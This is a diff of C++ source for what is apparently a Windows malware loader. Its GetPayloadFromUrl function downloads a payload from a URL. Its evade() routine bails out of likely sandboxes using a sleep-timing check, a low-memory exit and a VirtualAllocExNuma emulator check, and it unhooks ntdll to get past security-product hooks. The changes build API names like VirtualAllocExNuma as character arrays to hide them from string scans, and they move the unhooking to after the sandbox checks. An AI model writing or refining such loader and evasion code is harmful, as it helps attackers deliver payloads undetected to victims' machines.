@@ -36,6 +36,9 @@ typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
 char aVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
 VirtualProtectFunc pwVirtualProtect = (VirtualProtectFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualProtect);
 
+typedef BOOL(WINAPI* VirtualAllocExNumaFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);
+char aVirtualAllocExNuma[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', '\0'};
+VirtualAllocExNumaFunc pwVirtualAllocExNuma = (VirtualAllocExNumaFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocExNuma);
 
 BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
     HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
@@ -72,7 +75,8 @@ BOOL CheckVirtualAllocExNuma(){
         return FALSE;
     }
 
-    FARPROC pVirtualAllocExNuma = GetProcAddress(hKernel32, "VirtualAllocExNuma");
+    
+    FARPROC pVirtualAllocExNuma = GetProcAddress(hKernel32, aVirtualAllocExNuma);
     if (pVirtualAllocExNuma == NULL) {
         return FALSE;
     }
@@ -113,7 +117,7 @@ void unhookNtll(){
 }
 
 void evade() {
-    unhookNtll();
+    
     FILETIME startTime;
     GetSystemTimeAsFileTime(&startTime);
     Sleep(2000);
@@ -141,7 +145,7 @@ void evade() {
 	if (totalPhysicalMemoryInGB <= 1) {
 		exit(1);
 	}
-
+    unhookNtll();
     CheckVirtualAllocExNuma();  
 };
 
